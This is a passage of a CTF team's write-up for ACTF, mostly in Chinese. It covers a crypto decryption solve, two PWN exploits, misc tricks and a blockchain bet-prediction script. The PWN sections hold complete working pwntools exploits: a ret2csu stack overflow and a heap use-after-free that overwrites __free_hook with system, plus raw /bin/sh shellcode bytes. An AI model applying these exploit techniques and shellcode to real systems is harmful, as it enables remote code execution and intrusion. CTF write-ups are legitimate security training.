payload1="ea 4d 61 86 4a 51 5f e4 78 41 3b 4c 12 94 b5 7a 38 82 07 14 5b 56 22 4a 50 91 6a be 01 12 1f 12 80 10 6f c5 a5 77 a8 3a 1d 40 af 89 7a 07 a1 8d 0c df 13 18 f2 d2 d2 7e 42 4c 55 57 5c 20 90 7d 2d f2 47 8a 05 19 c8 17 06 33 f1 a9 4d b6 15 ac 37 bb a6 48 c1 33 df f4 26 c2 0a 28 f9 12 5f e1 fd 35 d0 af 55 07 01 85 16 92 62 6b 6f fa c7 43 4f 92 b5 68 c2 66 53 36 52 de 21 86 43 23 03 38 98 f5 14 fd 5c b0 ef 20 59 fe 9a b6 8e 29 17 d7 5d 5c cf c6 a8 c2 1d ba 69 d7 3b b7 99 44 c3 8b b5 20 8f fe 67 e0 28 64 9a 40 6a 2b d7 1d 86 70 f1 9f ef a7 19 cf db e6 72 f4 c5 8a 1e 2d 1c 09 2c 3f 21 db 23 bf 63 f7 da 5d 78 90 56 02 f2 22 e4 58 a5 ca 7a 04 83 5d 4c d9 0a 1a 5d 90 0a 78 f6 75 16 ea 44 32 89 97 1a 7f e2 da 15 7d 60 ce 1b 63 31 ac c8 7e f6 9c e9 58 9e fa 9c 54 69"
payload2='84 11 de 79 f3 a0 cf b3 04 f6 df ec 30 5c 00 ca 30 d7 69 82 9e 55 9b 42 8d c6 f0 ae 6d 8b 73 d9 af bb bf a8 b4 f4 e5 ad 6b be 55 3b eb 34 97 88 2b 8a 41 3f ee e3 20 f6 38 69 b7 9b 98 ac 6a 67 83 e0 e5 de e5 e1 8e 80 43 13 e2 2e 56 38 3a fd b4 ea a5 44 87 ad 8a ec 5a 5e 01 6e 5d db 39 44 81 39 57 e7 05 24 e0 58 e8 56 41 fa 4d cd b2 71 4d 6a a4 79 16 0b 43 68 c8 db ad d6 6d 8d 8a 9e 4c 8a 7f 58 45 54 f3 15 22 82 35 59 38 1e 75 4e 8c c8 c6 a0 0b e2 6d 75 0d 78 49 36 6e cc b2 24 90 9d c9 8b da 4e 51 81 15 3c 67 07 c0 f6 5c 9c 6d a1 14 8c fe fd c7 7a 65 63 69 17 f9 3c 8c 0d 44 7e bd 7e 49 89 4f b4 61 7a b6 b3 70 9e 2a b3 b9 c9 fe 18 94 7e b4 50 85 e7 b9 e7 2c db c0 10 92 ac 60 3c c2 f7 cb fb fb b6 9f f9 af fa ba 60 9b 99 cf 35 69 4b 9b 9e f4 ca b3 df bc 1d 7b '
payload3='4a 21 06 5d 5a b2 a0 e2 cb 4f 31 e2 2b dd d9 57 6e 81 cd 31 05 dc 91 a9 fb 9d b0 dc ec 19 7b e8 4e 44 1a 79 ec b4 15 53 85 2f 15 58 78 5d c3 1f 03 62 08 a4 52 c3 57 b1 52 4c f5 6d bc df 98 5e 64 35 b8 f6 17 4c fd 28 d9 2e 3d 30 ab e9 82 ee 10 d8 0a 75 31 55 be d8 9c 85 ba d3 64 9b ed 2f 2e 41 a5 3c 1a 1e dd 65 47 22 70 14 86 82 35 ac 5e bb e6 e8 c7 cb 92 64 0d 0c dd 81 a6 91 35 ad 3b 36 39 be e2 46 28 5c c5 13 cb 6d 21 64 47 34 2c 59 6d 77 df e6 4a 06 66 7b 64 f4 b7 5a c7 c6 03 cb 5c 02 ac ea f4 f7 80 ec 1c c4 3f ed 5f b8 cf 19 4b 02 9d 8e 48 5f ff 93 69 5f 37 86 21 02 b7 60 60 54 9e a9 d0 c5 f8 52 be 7c ed 74 e3 0d cd a4 bb 95 13 a9 57 fa e0 8e 41 aa 09 74 b5 b0 45 67 f8 a4 9d a9 4c 0f c8 f2 82 0a 45 71 18 da ec e7 5a 4e d4 5d 0d b8 75 7c 47 a9 d1 85 e5'
payload4='a6 36 7b 6a a5 55 af 69 a9 a9 7d 0e 09 aa 48 86 d5 27 20 c7 74 65 e3 37 18 76 8d 14 89 d9 d1 cc 84 d0 ed 7b d6 04 55 00 2e 04 ee 7f ae 36 8c 47 83 82 a2 ef 26 4b dd 91 73 d2 8c 29 31 5b 8f 3e 3c 19 24 89 50 be d6 5f e7 88 e4 ac 13 71 26 85 1b c8 8d 47 94 e6 41 85 9e 6f b2 '
payloads=[payload1,payload2,payload3,payload4]
#CRC=crc(dataheader+dump_str(payload),Init)
#print(CRC)
'''
for remote in range(10):
    tmppayload=b""
    tmpremote=remote
    for i in range(4):
        tmppayload+=secure_decrypt_packet(sessionkey,dump_str(payloads[i]),tmpremote.to_bytes(13,"little"))
        tmpremote+=1
    try:
        msg=base64.b64decode(tmppayload)
        print(msg)
        print("remote:",remote)
    except:
        continue
'''
#b"You mean this one? Shall I compare thee to a summer's day? Thou art more lovely and more temperate: Rough winds do shake the darling buds of May, And summer's lease hath all too short a date: Sometime too hot the eye of heaven shines, And often is his gold complexion dimmed, And every fair from fair sometime declines, By chance, or nature's changing course untrimmed: But thy eternal summer shall not fade, Nor lose possession of that fair thou ow'st, Nor shall death brag thou wander'st in his shade, When in eternal lines to time thou grow'st, So long as men can breathe, or eyes can see, So long lives this, and this gives life to thee."
#remote: 4


'''
payload='b7 29 d4 27 d4 a9 d5 95 2e c3 ce cc 1e 70 15 9c 27 c6 63 8d 8a 03 ed 6c f1 e4 f5 b1 43 96 1e d9 a7 9f ae e8 90 f5 ec ad 63 9e 4f 09 ce 13 cf bc 33 d8 4f 27 c8 ea 3a ce 11 78 a8 b1 8e 9f 6b 5f ac e2 e8 eb ed c4 8f ae 7a 36 d5 00 60 0a 53 ea 89 e8 c6 1a 95 c5 fc d8 54 45 71 15 63 fe 16 64 d1 21 42 ee 11 2a f2 6d cb 73 40 a3 45 d0 99 6a 49 52 b1 3f 1f 70 3d 4c 99 b1 b3 e9 02 87 8f f7 45 ac 61 21 6b 49 d8 38 05 8d 0a 68 37 00 1b 11 bc c6 c4 82 31 eb 51 44 5f 74 48 35 58 dd bc 11 9f f7 b9 85 cb 1e 69 b0 0b 42 48 75 e2 d0 4d 96 65 f2 01 85 e9 97 bc 48 72 47 42 54 e1 2d 99 54 76 59 b7 58 52 ba 5e 99 41 64 b7 cf 45 90 49 f2 80 ff ff 1d b3 70 bd 72 90 ed b3 c5 37 d6 a7 35 fa 99 3e 09 e8 c5 de bc d5 85 8a 98 f8 f4 aa 4d c9 ce ce 01 3d 6f 95 8f da d7 87 e0 99 36 44'
payload1='10 13 37 5c 5c a9 83 e3 90 5a 58 f7 05 de 88 33 7f b3 fc 34 1c da ab 9e ae cf 90 ab 8b'

for local in range(30):
    encrypt=1
    moredata=1
    data_packet = b""
    data_packet += int(encrypt << 7 | moredata << 6 |(8 & 0x3f)).to_bytes(1, "little")
    datalength=0xff
    data_packet += datalength.to_bytes(1, "little")
    msg=secure_decrypt_packet(sessionkey,dump_str(payload),local.to_bytes(13,"little"))
    try:
        msg=base64.b64decode(msg)
        print(msg)
        print("local:",local)
    except:
        continue
'''


payload='a2 16 25 39 df 5b ac 45 95 86 53 58 12 db 74 a6 cb 54 1d d7 1f 64 ec 4d 12 71 9f 32 a6 de f8 99 e3 d7 eb 62 c4 12 77 02 17 3e c2 42 bc 32 aa 5e 82 fe e8 ea 33 5b c4 ad 7d c8 f2 2e 20 59 a3 04 19 17 1a be 73 af e6 5b fa a6 ad a3 2a 15 78 8d 0d b6 b3 59 b0 be 7f a6 af 68 cd e6 e2 4c a9 5d'
for local in range(10):
    encrypt=1
    moredata=0
    data_packet = b""
    data_packet += int(encrypt << 7 | moredata << 6 |(8 & 0x3f)).to_bytes(1, "little")
    datalength=0x60
    data_packet += datalength.to_bytes(1, "little")
    msg=secure_decrypt_packet(sessionkey,dump_str(payload),local.to_bytes(13,"little"))
    try:
        msg=base64.b64decode(msg)
        print(msg)
        print("local:",local)
    except:
        continue

#b'You got your flag: ACTF{ShORt_NUmeR1c_KEY_1s_Vuln3R4bLe_TO_e@V3sDropPEr}'
#local: 7
    
'''
payload='18 ae e9 5e ca c0 9e e6 3d d2 87 07 b8 94 2d 4f 2a 70 52 d7 1b fd 27 d8 1b cc ef fd 20 8a 14 63 f9 a1 35 24 8d ef 57 81'
for remote in range(10):
    tmppayload=b""
    tmpremote=remote
    for i in range(4):
        tmppayload+=secure_decrypt_packet(sessionkey,dump_str(payload),tmpremote.to_bytes(13,"little"))
        tmpremote+=1
    try:
        msg=base64.b64decode(tmppayload)
        print(msg)
        print("remote:",remote)
    except:
        continue
'''
#b'Nevermind, long live the AAA'
#remote: 8

'''
payload='fd 81 d2 b5 8c 5e 32 06'
for remote in range(20):
    tmppayload=b""
    tmpremote=remote
    for i in range(4):
        tmppayload+=secure_decrypt_packet(sessionkey,dump_str(payload),tmpremote.to_bytes(13,"little"))
        tmpremote+=1
    try:
        msg=base64.b64decode(tmppayload)
        print(msg)
        print("remote:",remote)
    except:
        continue
'''
#b'Cool'
#remote: 9
```

## 

## 

# PWN

## 2048 

玩2048游戏(https://github.com/nneonneo/2048-ai)，最后一个栈溢出，先泄漏远程地址，然后将system写到data数据段，都是用ret2csu完成

```Python
from pwn import *
import re
import random
import IPython
import subprocess
import ctypes
import math

s       = lambda data               :ctx.send(data)        #in case that data is a int
sa      = lambda delim,data         :ctx.sendafter(delim, data) 
sl      = lambda data               :ctx.sendline(data)
sla     = lambda delim,data         :ctx.sendlineafter(delim, data)
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()

rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)

uu32    = lambda data   :u32(data.ljust(4, b'\0'))
uu64    = lambda data   :u64(data.ljust(8, b'\0'))


debugg = False
#context.log_level = 'debug'
context.arch = 'aarch64'
context.terminal = ['tmux', 'splitw', '-h', '-p70']
if debugg:
    #ctx = process(["qemu-aarch64", "-L", "./libc", "./2048"])
    ctx = process(["qemu-aarch64", "-g", "1234", "-L", "./libc", "./2048"])
    #ctx = process(["./qemu-aarch64-static", "-g", "1234", "-L", "./libc", "./babyarm"])
else:
    ctx = remote('124.70.166.38',9999)
    ru(b'`')
    cmd = ru(b'`')
    res = subprocess.getstatusoutput(cmd)
    sl(res[1].encode())

#local
#libc_base = 0x4000859000

sa(b'name: \n',b'/bin/sh\x00')
ru(b'\n')
target = [str(pow(2,i)).encode() for i in range(1,12)]

def get_board():
    recv_data = ctx.recvrepeat(timeout=0.01)
    recv_data = recv_data[recv_data.rindex(b'Score: '):]
   # print(recv_data)

    recv_data = recv_data.split(b'\n')
    recv_data = recv_data[1:]
    #print(recv_data)
    res = []
    rec_num = 0
    for hang in range(1,5):
        tt = []
        #IPython.embed()
        data = recv_data[rec_num+2].split(b'|')
        #print(data)
        for lie in range(1,5):
            data[lie] = data[lie].replace(b'32m',b'')
            tmp = re.findall(b'(\d+)',data[lie])
            found = False
            for j in tmp:
                if j in target:
                    if j == b'2048':
                        return True
                    num = target.index(j)+1
                    tt.append(num)
                    found = True
                    break
            if not found:
                tt.append(0)
        res.append(tt)
        rec_num += 4
    print(res)
    return res

ailib = ctypes.CDLL("./2048-ai/bin/2048.so")
ailib.init_tables()

ailib.find_best_move.argtypes = [ctypes.c_uint64]
ailib.score_toplevel_move.argtypes = [ctypes.c_uint64, ctypes.c_int]
ailib.score_toplevel_move.restype = ctypes.c_float

def movename(move):
    return [b'w', b's', b'a', b'd'][move]
def to_c_board(m):
    board = 0
    i = 0
    for row in m:
        for c in row:
            board |= int(c) << (4*i)
            i += 1
    return board

def print_board(m):
    for row in m:
        for c in row:
            print('%8d' % c, end=' ')
        print()

def _to_val(c):
    if c == 0: return 0
    return 2**c

def to_val(m):
    return [[_to_val(c) for c in row] for row in m]

def _to_score(c):
    if c <= 1:
        return 0
    return (c-1) * (2**c)

def to_score(m):
    return [[_to_score(c) for c in row] for row in m]

MULTITHREAD = True
if MULTITHREAD:
    from multiprocessing.pool import ThreadPool
    pool = ThreadPool(4)
    def score_toplevel_move(args):
        return ailib.score_toplevel_move(*args)

    def find_best_move(m):
        board = to_c_board(m)

        print_board(to_val(m))

        scores = pool.map(score_toplevel_move, [(board, move) for move in range(4)])
        bestmove, bestscore = max(enumerate(scores), key=lambda x:x[1])
        if bestscore == 0:
            return -1
        return bestmove
else:
    def find_best_move(m):
        board = to_c_board(m)
        return ailib.find_best_move(board)

all_res = 'dawswwwwwwwwdsadsddddwsdsddddssaaaadasddwwsddwswwssssdsadaadaaasdsaadadsssdwswwsdsssswsddddsawadwwwwwwwawwaadadwdddwdwwdwwdadwwawaawddwwdddwswddddddwddwawddwawwwwaaaaaaadwadaaaadaadwdwdwaaawddwaawawaadaaawaawaaadwawadadadwaaawadaawwawwdwaawawwaawssawwawswsssswwaswaaaaaaasssaaaawwwwaaawwaswwsssaawaawadwawawdadwadddwwwaaaddwdaaddwwdawdddwddaddwawawwdawawwwawwdwwddddwwwadwadawwdwdwwdaadaawwawdaaawdwwdaddwdwadwwwddwwawwadadaawwwaadaddadadwawwaawdwaaawadaaawaawadaadwdddwwdwadadaawdwwadwadawawadwadawdwaawaawaawaaaaaaswswsawawswawwwwwwsswadawwaawwaaawaadadaddawadadwwawadadadwasawaswsssaaaasasaaawaawawsaassaswswawwawwwaaaawwsawasaswasswswwawaaswwssdwaaasasaaaasasawsaawwsssswssaasawwsaaawsswsswasaswawsassawaaawaswasasawaaaaaassasssaasssaawwssswawaaaaaawwawwawasawasawssssasasasaasasassssssssaawswsssssssassassasassawasasawwaawaaaasswaaswaswssswwawssawswwswswawwwaaswwwawsssaawasssaaawwawawwaaswwwwwaaswssssawwwwwaaawasassassawaasaasswaadwawwwdddddwa'
#all_res = b''

#while True:
#    m = get_board()
#    if m == True:
#        break
#    res = movename(find_best_move(m))
    #print(res)
#    all_res += res
#    s(res)
#print(all_res)
for i in all_res:
    ru(b'Score')
    s(i.encode())
    sleep(0.01)

def csu_rop(call, x0, x1, x2):
    payload = flat(0x4020D8, b'00000000', 0x04020B8, 0, 1, call)
    payload += flat(x0, x1, x2)
    return payload

#ru('[y/n]: ')
#gdb.attach(ctx,gdbscript="b *0x401EFC")
elf = ELF('./2048')
payload = b''
payload += cyclic(0x20,n=8)
#payload += p64(0) + csu_rop(elf.got['puts'], elf.got['puts'], 0, 0)
payload += p64(0) + csu_rop(elf.got['read'], 0, 0x413000, 8)
payload += p64(0) + csu_rop(0x413000, 0x413154, 0, 0)[0x10:]
#payload += csu_rop(0x413000, 0x413154, 0, 0)
s(payload)
ru(b'Bye~\n')
s(p64(0x4000875568))
#leak = uu64(ru(b'\n'))
#log.success("leak = %s"%hex(leak))
# remote_base = 0x4000835000

ctx.interactive()
```

##  tree 

uaf

```Apache
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux', 'splitw', '-h']
prog = './treepwn'
#elf = ELF(prog)#nc 121.36.194.21 49155
# p = process(prog,env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("./libc-2.27.so")
p = remote("121.36.241.104", 9999)#nc 124.71.130.185 49155
def debug(addr,PIE=True): 
    debug_str = ""
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
        for i in addr:
            debug_str+='b *{}\n'.format(hex(text_base+i))
        gdb.attach(p,debug_str) 
    else:
        for i in addr:
            debug_str+='b *{}\n'.format(hex(i))
        gdb.attach(p,debug_str) 

def dbg():
    gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))

    
def dbgc(addr):
    gdb.attach(p,"b*" + hex(addr) +"\n c")

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def choice(idx):
    sla('Your choice > ',str(idx))

def add(x,y,name):
    choice(0)
    sla("new element x-coordinate value: ",str(x))
    sla("new element y-coordinate value: ",str(y))
    sa("new element name: ",name)

def delete(x,y):
    choice(1)
    sla("want element x-coordinate value: ",x)
    sla("want element y-coordinate value: ",y)
    # sla("Index: ",idx)

def show(x,y):
    choice(3)
    sla("want element x-coordinate value: ",x)
    sla("want element y-coordinate value: ",y)

def edit(x,y,con):
    choice(2)
    sla("want element x-coordinate value: ",x)
    sla("want element y-coordinate value: ",y)
    sa("input the edited name: ",con)

def query(idx,con):
    choice(4)
    sla("Index: ",idx)
    # sla("size?",sz)
    sa("Content: ",con)



def exp():
    #debug([0x7B9])
    # sla("")


    ru("in 30 seconds\n")
    import os
    str1 = raw_input("hash: ").strip('\n')
    print(str1)
    sl(str1)
    # for i in range

    add(1,2,'3'*0x20)
    add(1,3,'3'*0x20)
    add(1,4,'3'*0x20)
    add(1,5,'3'*0x20)

    add(2,1,'4'*0x20)
    add(2,2,'6'*0x20)
    add(2,3,'8'*0x20)
    # add(2,4,'7'*0x20)
    # add(3,1,'7'*0x20)
    # add(3,2,'7'*0x20)
    add(3,3,'7'*0x20)
    add(4,3,'7'*0x20)
    # add(3,4,'7'*0x20)
    

    # 12 22 21 23  13 14 15 23 
    # delete(2,4)




    #########################
    # delete(3,3)

    delete(2,1)
    delete(2,3)



    show(2,3)
    # add(4,4,'5'*0x20)
    # delete(2,3)
    # 0
    # show(2,4)
# 13 14 15

    ru("found!!! its name: ")
    r(8)
    data = uu64(r(8))
    lg('data',data)

    # data1 = data - 0x5651a519a010 + 0x5651a519a7a0
    # data2 = data - 0x564175f07010 + 0x0000564175f076f0

    pay = p64(data).ljust(0x20,'\x00')
    edit(2,3,pay)




    add(4,4,'8'*0x20) # 2 3 ori
    pay = p64(0)+p64(0)*3


    add(2,3,pay)# heap#===>


    delete(1,5)
    # delete(4,3)
    delete(3,3)
    pay = p64(data+0x30).ljust(0x20,'\x00')
    edit(3,3,pay)

    add(7,7,'8'*0x20)# ori 3 3
    pay = p64(data)*4
    add(8,8,pay)#===>
    #-----------------------------------------------
    edit(2,3,p16(0x0201).ljust(0x20,'\x07'))
    edit(8,8,p64(data+0x557397eb7350-0x557397eb7010-0x30)*4)
    add(9,9,p64(0x0000000300010000)+p64(0x91)+p64(0)*2)
    delete(1,4)

    show(9,9)

    # delete(2,3)  # this ptr 0x102 3
    # edit(0x102,3,p8(0)*0x20)

    # show(0x102,3)
    # delete(3,3)
    # delete(1,5)
    # edit(0x102,3,p8(7)*0x20)

    # pay = p64(data-0x55a0666bb010+0x55a0666bb2e0)+'a'*0x18
    # edit(3,3,pay)

    # add(6,6,'8'*0x20)
    # add(0x7ff,3,'8'*0x20)

    # delete(0x7ff,3)
    # delete(0x7ff,3)
# #########################
#   delete(6,6)
#   delete(3,3)
    
    # show(0x102,3)
    # add(10,10,'a'*0x20)
    ru("found!!! its name: ")
    r(0x10)
    lib = uu64(r(8))
    lg('lib',lib)
    addr = lib - 0x7f139b6f3ca0 + 0x7f139b308000
    lg('addr',addr)
    fh = addr + libc.sym['__free_hook']
    sys = addr + libc.sym['system']
    #--------------------------------------
    # edit(2,3,p16(0x0101).ljust(0x20,'\x07'))
    edit(8,8,p64(fh)*4) 
    add(11,11,p64(sys)*4)
    edit(9,9,'/bin/sh\x00'.ljust(0x20,'\x00'))
    # delete(9,9)
    edit(1,2,'/bin/sh\x00'.ljust(0x20,'\x00'))
    delete(1,2)
    # dbg()
    it()
if __name__ == '__main__':
    exp()
```

## 

# Misc

## safer-telegram-bot-1 

发现在发送/login时会短暂赋予user1权限,因此一直发/login使其处于user1状态时点login

![微信图片_20220628215741](https://cdn.jsdelivr.net/gh/whitegive111/photo/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220628215741.png)



## Signin 

5种压缩方式，手动解压

(mv flag flag.bz2 && bunzip2 flag.bz2) || (mv flag.bz2 flag.zst && zstd -d flag.zst)  || (mv flag.zst flag.lzma && lzma -d flag.lzma) || (mv flag.lzma flag.gz && gunzip flag.gz) || (mv flag.gz flag.xz && xz -d flag.xz)

得到flag

ACTF{r0cK_4Nd_rolL_1n_C0mpr33s1ng_aNd_uNCOmrEs5iNg}



# Blockchain

## bet2loss

```Plain%20Text
pragma solidity ^0.8.0;

contract test {
    uint256 x;
    uint256 d;
    constructor() {
        x=1;
        d=block.difficulty;
    }
}
```

先部署一个合约拿到difficulty，发现固定不变

连续点击bet，查看题目合约的latest变量，发现每次固定增加30

再读取当前的nonce

使用自动化工具selenium点击页面即可完成bet

```Python
import os
from time import sleep
from selenium.webdriver import Chrome
import requests

driver_path = os.path.join(os.path.dirname(__file__), "chromedriver.exe")
driver = Chrome(executable_path=driver_path)

driver.get("http://123.60.36.208:30000/")
input_bet_value = driver.find_element_by_xpath('//*[@id="bet_value"]')
input_bed_mod = driver.find_element_by_xpath('//*[@id="bet_mod"]')
button_bet = driver.find_element_by_xpath('//*[@id="do_bet"]')

driver.find_element_by_xpath('//*[@id="request"]').click()
sleep(30)
driver.find_element_by_xpath('//*[@id="new_airdrop"]').click()
sleep(35)

account_address = driver.find_element_by_xpath('//*[@id="my_account"]').text

import binascii
import sha3

def b32(i):
    return binascii.unhexlify('%064x' % i)

def keccak256(x):
    return sha3.keccak_256(x).hexdigest()

def addr(x):
    return binascii.unhexlify('%040x' % x)

def getStorageAt(addr,at):
    URL = "http://123.60.36.208:8545/"
    data = {
       "jsonrpc": "2.0", 
       "method": "eth_getStorageAt", 
       "params":[addr, str(at) , "latest"],
       "id":0x1a0a
    }
    response = requests.post(url=URL,json=data)
    return (response.json())


t = eval(getStorageAt("0x21ac0df70A628cdB042Dde6f4Eb6Cf49bDE00Ff7",4)["result"])
nonce=367
cur_chance = prev_chance = 20


input_bet_value.send_keys("1")
input_bed_mod.send_keys("12")

button_bet.click()
nonce+=1

while True:
    sleep(0.5)
    cur_chance = int(driver.find_element_by_xpath('//*[@id="my_chance"]').text)
    if cur_chance != prev_chance:
        t = eval(getStorageAt("0x21ac0df70A628cdB042Dde6f4Eb6Cf49bDE00Ff7",4)["result"])
        prev_chance = cur_chance
        t=t+30
        rand = (int(keccak256(b32(nonce)+b32(t)+b32(2)+addr(eval(account_address))),16))
        print(nonce,t)
        nonce+=1
        v=rand%12
        input_bet_value.clear()
        input_bet_value.send_keys(str(v))

        input_bed_mod.clear()
        input_bed_mod.send_keys("12")

        button_bet.click()

sleep(60)
driver.quit()
```

## 

## 